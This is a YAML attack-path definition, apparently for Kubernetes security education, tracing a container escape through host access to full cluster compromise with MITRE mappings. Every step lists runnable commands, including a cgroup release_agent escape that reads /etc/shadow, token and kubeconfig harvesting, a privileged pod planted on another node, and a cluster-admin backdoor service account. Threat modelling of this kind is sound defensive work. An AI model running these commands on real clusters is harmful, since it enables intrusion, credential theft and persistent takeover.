title: "Container Escape to Host Compromise"
description: "An attack path showing how container escape can lead to host system compromise"
category: "Container Escape"
kubernetesVersion: "1.18+"
mitreTechniques:
  - T1611
  - T1068
  - T1548
steps:
  - id: "initial-compromise"
    title: "Initial Pod Compromise"
    description: |
      The attacker gains initial access to a running pod within the Kubernetes cluster. This is typically achieved through exploiting a vulnerability in the application running inside the container, such as Remote Code Execution (RCE), Server-Side Request Forgery (SSRF), or through misconfigured exposed services. Once inside, the attacker has a foothold to explore the container environment and look for escape opportunities.
    type: initial
    command:
      - "# Example: Reverse shell obtained via application vulnerability"
      - "id && whoami"
      - "cat /etc/os-release"
      - "ps aux"
    connections:
      - "capability-check"
    mitreTechnique: T1190

  - id: "capability-check"
    title: "Check Container Capabilities"
    description: |
      The attacker enumerates the container's security context to identify misconfigurations that could enable escape. This includes checking for privileged mode, excessive Linux capabilities (like CAP_SYS_ADMIN, CAP_NET_ADMIN), host namespace sharing (hostPID, hostNetwork, hostIPC), and mounted sensitive host paths. These misconfigurations are common in development environments or legacy deployments.
    type: lateral
    command:
      - "# Check if running as privileged"
      - "cat /proc/1/status | grep -i cap"
      - "capsh --print"
      - ""
      - "# Check for host namespace sharing"
      - "ls -la /proc/1/ns/"
      - "cat /proc/1/cgroup"
      - ""
      - "# Check mounted volumes"
      - "mount | grep -E '(docker|kubelet|hostPath)'"
      - "df -h"
    connections:
      - "escape-attempt"
    mitreTechnique: T1082

  - id: "escape-attempt"
    title: "Container Escape Execution"
    description: |
      Based on the discovered misconfigurations, the attacker executes the container escape. If the container is privileged, they can mount the host filesystem. If hostPID is enabled, they can access host processes. With CAP_SYS_ADMIN, they can mount cgroups and escape via the release_agent. Each escape vector provides different levels of host access.
    type: privilege
    command:
      - "# Privileged container escape via mounting host filesystem"
      - "mkdir -p /mnt/host"
      - "mount /dev/sda1 /mnt/host"
      - "chroot /mnt/host /bin/bash"
      - ""
      - "# Alternative: cgroup escape with CAP_SYS_ADMIN"
      - "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp"
      - "mkdir /tmp/cgrp/x"
      - "echo 1 > /tmp/cgrp/x/notify_on_release"
      - "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)"
      - "echo \"$host_path/cmd\" > /tmp/cgrp/release_agent"
      - "echo '#!/bin/sh' > /cmd && echo 'cat /etc/shadow > /output' >> /cmd"
      - "chmod a+x /cmd && sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\""
    connections:
      - "host-access"
    mitreTechnique: T1611

  - id: "host-access"
    title: "Gain Host System Access"
    description: |
      After successfully escaping the container, the attacker now has access to the underlying host system. They typically gain root or elevated privileges on the node. From here, they can access all containers running on this node, read sensitive files, install backdoors, and prepare for lateral movement within the cluster.
    type: privilege
    command:
      - "# Verify host access"
      - "hostname"
      - "cat /etc/hostname"
      - "ip addr show"
      - ""
      - "# Check for other containers on this node"
      - "crictl ps"
      - "docker ps"
      - ""
      - "# Access kubelet credentials"
      - "cat /var/lib/kubelet/config.yaml"
      - "ls -la /var/lib/kubelet/pki/"
    connections:
      - "cluster-node-access"
    mitreTechnique: T1548

  - id: "cluster-node-access"
    title: "Access Cluster Node Resources"
    description: |
      From the compromised host, the attacker accesses critical cluster resources stored on the node. This includes the kubelet's credentials, node certificates, service account tokens from all pods on the node, and potentially the kubeconfig files. These credentials can be used to interact with the Kubernetes API server with the node's privileges.
    type: lateral
    command:
      - "# Extract kubelet credentials"
      - "cat /etc/kubernetes/kubelet.conf"
      - "cat /var/lib/kubelet/kubeconfig"
      - ""
      - "# Find all service account tokens on this node"
      - "find /var/lib/kubelet/pods -name 'token' -exec cat {} \\;"
      - ""
      - "# List all secrets mounted in pods"
      - "find /var/lib/kubelet/pods -type d -name 'secrets'"
      - ""
      - "# Access other containers' filesystems"
      - "ls /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/"
    connections:
      - "lateral-movement"
    mitreTechnique: T1552

  - id: "lateral-movement"
    title: "Lateral Movement to Other Nodes"
    description: |
      Using the compromised node's credentials and the kubelet's certificate, the attacker can authenticate to the Kubernetes API and potentially to other nodes. If SSH keys are found on the node or if there are shared credentials, the attacker can directly access other nodes. They may also deploy privileged pods on other nodes to compromise them.
    type: lateral
    command:
      - "# Use kubelet credentials to access API"
      - "kubectl --kubeconfig=/etc/kubernetes/kubelet.conf get nodes"
      - "kubectl --kubeconfig=/etc/kubernetes/kubelet.conf get pods -A"
      - ""
      - "# Look for SSH keys"
      - "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null"
      - "cat /root/.ssh/authorized_keys"
      - ""
      - "# Deploy pod on another node for access"
      - "kubectl run pwned --image=alpine --overrides='{\"spec\":{\"nodeName\":\"target-node\",\"containers\":[{\"name\":\"pwned\",\"image\":\"alpine\",\"command\":[\"sleep\",\"infinity\"],\"securityContext\":{\"privileged\":true}}]}}'"
    connections:
      - "cluster-compromise"
    mitreTechnique: T1021

  - id: "cluster-compromise"
    title: "Full Cluster Compromise"
    description: |
      With access to multiple nodes and potentially the control plane, the attacker achieves full cluster compromise. They can now access all secrets across the cluster, manipulate workloads, intercept network traffic, and establish persistent backdoors. The attacker has complete control over the Kubernetes infrastructure and all data within it.
    type: exfiltration
    command:
      - "# Dump all cluster secrets"
      - "kubectl get secrets -A -o yaml > all_secrets.yaml"
      - ""
      - "# Access etcd directly (if control plane compromised)"
      - "ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 get / --prefix --keys-only"
      - ""
      - "# Create persistent backdoor"
      - "kubectl create serviceaccount backdoor -n kube-system"
      - "kubectl create clusterrolebinding backdoor --clusterrole=cluster-admin --serviceaccount=kube-system:backdoor"
      - ""
      - "# Exfiltrate data"
      - "kubectl cp default/target-pod:/app/data ./exfiltrated_data"
    mitreTechnique: T1530
